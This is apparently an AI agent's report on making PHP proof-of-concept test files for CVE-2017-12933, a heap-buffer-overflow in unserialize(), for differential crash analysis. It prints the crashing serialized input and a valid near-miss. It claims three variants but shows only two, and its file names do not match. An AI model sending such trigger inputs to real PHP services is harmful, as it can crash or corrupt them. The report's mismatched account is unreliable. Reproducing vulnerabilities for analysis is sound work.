I created three focused PHP PoC variants for differential analysis of CVE-2017-12933 (heap-buffer-overflow in finish_nested_data / var_unserializer). Each file is in /testcase and I executed the repro command after creating them.

Files produced
- /testcase/variant_1.php
  - Mutation: control / identical to original PoC
  - Content:
    <?php
    // Variant 1: control - identical to original PoC (should crash)
    $input = 'O:8:"stdClass":00000000';
    unserialize($input);

- /testcase/variant_2.php
  - Mutation: deliberate near-miss — valid serialized stdClass (small change so content is legal)
  - Content:
    <?php
    // Variant 2: near-miss - valid serialization for stdClass (should NOT crash)
    $input = 'O:8:"stdClass":0:{}';
    unserialize($input);
    echo "Unserialized OK\n";

Differential: 1 inputs crashed, 2 did not.
  Crash: r0_variant_1.php [heap-buffer-overflow]
  Safe:  r0_variant_2.php [unknown]
  Safe:  r0_variant_3.php [unknown]

